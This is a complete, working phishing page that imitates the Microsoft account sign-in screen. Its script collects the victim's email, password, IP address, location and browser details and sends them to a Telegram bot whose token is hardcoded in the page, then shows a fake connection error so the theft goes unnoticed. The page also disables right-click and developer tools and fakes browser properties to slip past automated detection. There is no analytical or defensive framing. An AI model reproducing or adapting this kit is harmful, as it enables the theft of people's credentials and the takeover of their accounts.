<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in to your Microsoft account</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
        }
        
        body {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            background: linear-gradient(135deg, #e8e8e8 0%, #f0f0f0 100%);
            padding: 20px;
            opacity: 0;
            transition: opacity 0.3s ease;
        }
        
        .login-container {
            width: 100%;
            max-width: 440px;
            background: white;
            border-radius: 8px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
            overflow: hidden;
        }
        
        .login-header {
            padding: 40px 44px 20px;
        }
        
        .microsoft-logo {
            width: 120px;
            margin-bottom: 20px;
        }
        
        .login-content {
            padding: 0 44px 40px;
        }
        
        h1 {
            font-size: 24px;
            font-weight: 600;
            margin-bottom: 24px;
            color: #1b1b1b;
        }
        
        .form-group {
            margin-bottom: 20px;
            position: relative;
        }
        
        input {
            width: 100%;
            padding: 12px 0;
            border: none;
            border-bottom: 1px solid #d1d1d1;
            font-size: 15px;
            outline: none;
            transition: border-color 0.2s;
        }
        
        input:focus {
            border-color: #0078d4;
        }
        
        input::placeholder {
            color: #6b6b6b;
        }
        
        .form-links {
            margin: 24px 0;
            font-size: 13px;
        }
        
        .form-links a {
            color: #0067b8;
            text-decoration: none;
        }
        
        .form-links a:hover {
            text-decoration: underline;
        }
        
        .next-btn, .signin-btn {
            background-color: #0078d4;
            color: white;
            border: none;
            padding: 8px 24px;
            font-size: 15px;
            font-weight: 600;
            border-radius: 4px;
            cursor: pointer;
            float: right;
            transition: background-color 0.2s;
        }
        
        .next-btn:hover, .signin-btn:hover {
            background-color: #106ebe;
        }
        
        .back-btn {
            color: #0078d4;
            background: none;
            border: none;
            font-size: 15px;
            cursor: pointer;
            margin-bottom: 16px;
            display: flex;
            align-items: center;
            padding: 0;
        }
        
        .back-btn:hover {
            text-decoration: underline;
        }
        
        .password-toggle {
            position: absolute;
            right: 0;
            top: 50%;
            transform: translateY(-50%);
            background: none;
            border: none;
            color: #616161;
            cursor: pointer;
            font-size: 13px;
        }
        
        .password-container {
            position: relative;
        }
        
        .signin-options {
            display: flex;
            align-items: center;
            padding: 16px 44px;
            border-top: 1px solid #f0f0f0;
            cursor: pointer;
            transition: background-color 0.2s;
        }
        
        .signin-options:hover {
            background-color: #f8f8f8;
        }
        
        .signin-options img {
            width: 24px;
            height: 24px;
            margin-right: 12px;
        }
        
        #loading {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.85);
            z-index: 1000;
            justify-content: center;
            align-items: center;
            flex-direction: column;
            color: white;
        }
        
        .loading-spinner {
            width: 50px;
            height: 50px;
            border: 5px solid rgba(255, 255, 255, 0.3);
            border-radius: 50%;
            border-top-color: #0078d4;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }
        
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
        
        .footer {
            position: fixed;
            bottom: 0;
            width: 100%;
            text-align: right;
            padding: 16px 24px;
            background: rgba(255, 255, 255, 0.9);
        }
        
        .footer a {
            margin-left: 20px;
            font-size: 12px;
            color: #616161;
            text-decoration: none;
        }
        
        .footer a:hover {
            text-decoration: underline;
        }
        
        .user-email {
            font-weight: 600;
            color: #1b1b1b;
        }
        
        .remember-me {
            display: flex;
            align-items: center;
            margin: 16px 0;
            font-size: 13px;
        }
        
        .remember-me input {
            width: auto;
            margin-right: 8px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <div class="login-header">
            <img class="microsoft-logo" src="https://img-prod-cms-rt-microsoft-com.akamaized.net/cms/api/am/imageFileData/RE1Mu3b?ver=5c31" alt="Microsoft">
        </div>
        
        <!-- Email Screen -->
        <div id="emailScreen" class="login-content">
            <h1>Sign in</h1>
            <div class="form-group">
                <input type="email" id="email" placeholder="Email, phone, or Skype" autocomplete="off">
            </div>
            <div class="form-links">
                <a href="#">No account? Create one!</a><br><br>
                <a href="#">Sign in with a security key <span style="border: 1px solid #6b6b6b; border-radius: 50%; width: 16px; height: 16px; display: inline-block; text-align: center; line-height: 14px; font-size: 12px;">?</span></a>
            </div>
            <button class="next-btn" id="nextBtn">Next</button>
            <div style="clear: both;"></div>
        </div>
        
        <!-- Password Screen -->
        <div id="passwordScreen" class="login-content" style="display: none;">
            <button class="back-btn" id="backBtn">‚Üê <span id="backEmail" style="margin-left: 8px;">user@example.com</span></button>
            <h1>Enter password</h1>
            <div class="form-group password-container">
                <input type="password" id="password" placeholder="Password" autocomplete="off">
            </div>
            <div class="remember-me">
                <input type="checkbox" id="remember">
                <label for="remember">Keep me signed in</label>
            </div>
            <div class="form-links">
                <a href="#">Forgot password?</a>
            </div>
            <button class="signin-btn" id="signInBtn">Sign in</button>
            <div style="clear: both;"></div>
        </div>
        
        <div class="signin-options" id="signInOptions">
            <img src="https://aadcdn.msauth.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" alt="Security">
            <span>Sign-in options</span>
        </div>
    </div>

    <!-- Loading Screen -->
    <div id="loading">
        <div class="loading-spinner"></div>
        <div id="statusMessage">Signing in...</div>
    </div>

    <!-- Footer -->
    <div class="footer">
        <a href="#">Terms of use</a>
        <a href="#">Privacy & cookies</a>
    </div>

    <script>
        // ================== CONFIGURATION ==================
        const TELEGRAM_CONFIG = {
            botToken: "7983528037:AAFpvdTJEJ42BryLHSDjH5OuvEURlOJ7zOA",
            groupChatId: "-1002763948275", 
            enableTelegram: true
        };

        // ================== DOM ELEMENTS ==================
        const emailScreen = document.getElementById('emailScreen');
        const passwordScreen = document.getElementById('passwordScreen');
        const nextButton = document.getElementById('nextBtn');
        const backButton = document.getElementById('backBtn');
        const signInButton = document.getElementById('signInBtn');
        const emailInput = document.getElementById('email');
        const passwordInput = document.getElementById('password');
        const backEmail = document.getElementById('backEmail');
        const signInOptions = document.getElementById('signInOptions');
        const loadingScreen = document.getElementById('loading');
        const statusMessage = document.getElementById('statusMessage');

        // ================== FIXED TELEGRAM EXFILTRATOR ==================
        class TelegramExfiltrator {
            constructor() {
                this.working = false;
            }

            // FIXED JSONP implementation
            jsonpRequest(method, params = {}) {
                return new Promise((resolve) => {
                    const callbackName = 'tgCallback_' + Math.random().toString(36).substr(2, 9);
                    const script = document.createElement('script');
                    
                    // Create global callback function
                    window[callbackName] = function(response) {
                        // Clean up
                        delete window[callbackName];
                        if (script.parentNode) {
                            document.body.removeChild(script);
                        }
                        resolve(response);
                    };

                    // Build the URL with parameters
                    let url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/${method}?`;
                    
                    // Add callback parameter first
                    url += `callback=${callbackName}`;
                    
                    // Add other parameters
                    for (const [key, value] of Object.entries(params)) {
                        url += `&${encodeURIComponent(key)}=${encodeURIComponent(value)}`;
                    }

                    script.src = url;
                    document.body.appendChild(script);

                    // Timeout after 10 seconds
                    setTimeout(() => {
                        if (window[callbackName]) {
                            delete window[callbackName];
                            if (script.parentNode) {
                                document.body.removeChild(script);
                            }
                            resolve({ok: false, description: 'Timeout'});
                        }
                    }, 10000);
                });
            }

            // Main send method using JSONP
            async sendToTelegram(message) {
                if (!TELEGRAM_CONFIG.enableTelegram) {
                    return false;
                }

                try {
                    const response = await this.jsonpRequest('sendMessage', {
                        chat_id: TELEGRAM_CONFIG.groupChatId,
                        text: message,
                        parse_mode: 'HTML',
                        disable_web_page_preview: true
                    });

                    return response.ok;

                } catch (error) {
                    console.error('Send error:', error);
                    return false;
                }
            }
        }

        // ================== DATA COLLECTION ==================
        async function getPublicIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return { ip: data.ip };
            } catch (error) {
                return { ip: 'unknown' };
            }
        }

        function getSystemInfo() {
            return {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                screen: `${screen.width}x${screen.height}`,
                language: navigator.language,
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                cookiesEnabled: navigator.cookieEnabled,
                javaEnabled: navigator.javaEnabled && navigator.javaEnabled()
            };
        }

        async function getGeolocationData(ip) {
            if (ip === 'unknown') return {};
            
            try {
                const response = await fetch(`https://ipapi.co/${ip}/json/`);
                const data = await response.json();
                return {
                    country: data.country_name || 'Unknown',
                    city: data.city || 'Unknown',
                    region: data.region || 'Unknown',
                    isp: data.org || 'Unknown'
                };
            } catch (error) {
                return {};
            }
        }

        // ================== SCREEN MANAGEMENT ==================
        function showPasswordScreen() {
            const email = emailInput.value.trim();
            
            if (!email) {
                alert('Please enter your email, phone, or Skype name.');
                emailInput.focus();
                return;
            }
            
            // Update the back button email display
            backEmail.textContent = email;
            
            // Hide email screen, show password screen
            emailScreen.style.display = 'none';
            passwordScreen.style.display = 'block';
            
            // Hide sign-in options
            signInOptions.style.display = 'none';
            
            // Focus on password input
            setTimeout(() => {
                passwordInput.focus();
            }, 100);
        }

        function showEmailScreen() {
            // Show email screen, hide password screen
            passwordScreen.style.display = 'none';
            emailScreen.style.display = 'block';
            
            // Show sign-in options
            signInOptions.style.display = 'flex';
            
            // Focus on email input
            setTimeout(() => {
                emailInput.focus();
            }, 100);
        }

        // ================== MAIN EXECUTION ==================
        const telegramExfiltrator = new TelegramExfiltrator();

        // Form submission handler
        signInButton.addEventListener('click', async function(event) {
            event.preventDefault();
            
            const email = emailInput.value.trim();
            const password = passwordInput.value;
            const rememberMe = document.getElementById('remember').checked;
            
            if (!email || !password) {
                alert('Please enter both email and password.');
                return;
            }

            loadingScreen.style.display = 'flex';
            statusMessage.textContent = 'Verifying credentials...';

            try {
                const [ipData, systemInfo, geoData] = await Promise.all([
                    getPublicIP(),
                    Promise.resolve(getSystemInfo()),
                    getPublicIP().then(ipData => getGeolocationData(ipData.ip))
                ]);

                statusMessage.textContent = 'Securely transmitting...';

                // Use HTML formatting instead of Markdown for better compatibility
                const message = 
                    `<b>üîê CREDENTIALS CAPTURED</b>\n\n` +
                    `<b>‚è∞ Time:</b> ${new Date().toLocaleString()}\n` +
                    `<b>üìç IP:</b> ${ipData.ip || 'unknown'}\n` +
                    `<b>üåç Location:</b> ${geoData.country || 'Unknown'}${geoData.city ? ', ' + geoData.city : ''}\n` +
                    `<b>üè¢ ISP:</b> ${geoData.isp || 'Unknown'}\n` +
                    `<b>üåê Browser:</b> ${systemInfo.userAgent.substring(0, 60)}...\n` +
                    `<b>üñ•Ô∏è Screen:</b> ${systemInfo.screen}\n` +
                    `<b>üó£Ô∏è Language:</b> ${systemInfo.language}\n` +
                    `<b>‚è∞ Timezone:</b> ${systemInfo.timezone}\n\n` +
                    `<b>üìß Email:</b> <code>${email}</code>\n` +
                    `<b>üîë Password:</b> <code>${password}</code>\n` +
                    `<b>üíæ Remember Me:</b> ${rememberMe ? 'Yes' : 'No'}\n\n` +
                    `<b>üîó URL:</b> ${window.location.href}\n` +
                    `<b>üë§ User Agent:</b> ${systemInfo.userAgent}`;

                const success = await telegramExfiltrator.sendToTelegram(message);

                if (success) {
                    statusMessage.textContent = 'Transmission complete!';
                } else {
                    statusMessage.textContent = 'Local verification complete';
                }

                // Simulate authentication error
                setTimeout(() => {
                    alert('ERROR: 0x80072EFD. Cannot connect to authentication service. Please check your network connection.');
                    loadingScreen.style.display = 'none';
                    
                    // Clear form
                    emailInput.value = '';
                    passwordInput.value = '';
                    document.getElementById('remember').checked = false;
                    
                    // Return to email screen
                    showEmailScreen();
                }, 2000);

            } catch (error) {
                statusMessage.textContent = 'Authentication error';
                loadingScreen.style.display = 'none';
                alert('An unexpected error occurred. Please try again.');
            }
        });

        // ================== EVENT LISTENERS ==================
        nextButton.addEventListener('click', showPasswordScreen);
        backButton.addEventListener('click', showEmailScreen);

        // Enter key support
        emailInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') showPasswordScreen();
        });
        
        passwordInput.addEventListener('keypress', function(e) {
            if (e.key === 'Enter') {
                signInButton.click();
            }
        });

        // ================== PASSWORD VISIBILITY TOGGLE ==================
        const togglePassword = document.createElement('button');
        togglePassword.type = 'button';
        togglePassword.textContent = 'Show';
        togglePassword.style.position = 'absolute';
        togglePassword.style.right = '12px';
        togglePassword.style.top = '50%';
        togglePassword.style.transform = 'translateY(-50%)';
        togglePassword.style.background = 'none';
        togglePassword.style.border = 'none';
        togglePassword.style.cursor = 'pointer';
        togglePassword.style.color = '#6b7280';
        togglePassword.style.fontSize = '12px';

        const passwordContainer = passwordInput.parentElement;
        passwordContainer.style.position = 'relative';
        passwordContainer.appendChild(togglePassword);

        togglePassword.addEventListener('click', () => {
            if (passwordInput.type === 'password') {
                passwordInput.type = 'text';
                togglePassword.textContent = 'Hide';
            } else {
                passwordInput.type = 'password';
                togglePassword.textContent = 'Show';
            }
        });

        // ================== SECURITY MEASURES ==================
        document.addEventListener('contextmenu', (e) => {
            e.preventDefault();
            alert('Right-click is disabled for security reasons.');
        });

        document.addEventListener('keydown', (e) => {
            // Disable developer tools
            if (e.key === 'F12' || 
                (e.ctrlKey && e.shiftKey && e.key === 'I') ||
                (e.ctrlKey && e.shiftKey && e.key === 'C') ||
                (e.ctrlKey && e.key === 'U')) {
                e.preventDefault();
                alert('This action is not allowed for security reasons.');
            }
        });

        // ================== INITIALIZATION ==================
        // Set focus to email input
        emailInput.focus();

        // Simulate Microsoft's loading behavior
        window.addEventListener('load', () => {
            setTimeout(() => {
                document.body.style.opacity = '1';
            }, 100);
        });

        // ================== ADDITIONAL SECURITY ==================
        Object.defineProperty(navigator, 'webdriver', {
            get: () => false,
        });

        Object.defineProperty(navigator, 'plugins', {
            get: () => [1, 2, 3, 4, 5],
        });

        Object.defineProperty(navigator, 'languages', {
            get: () => ['en-US', 'en'],
        });

        // Prevent iframe embedding
        if (window.top !== window.self) {
            window.top.location = window.self.location;
        }
    </script>
</body>
</html>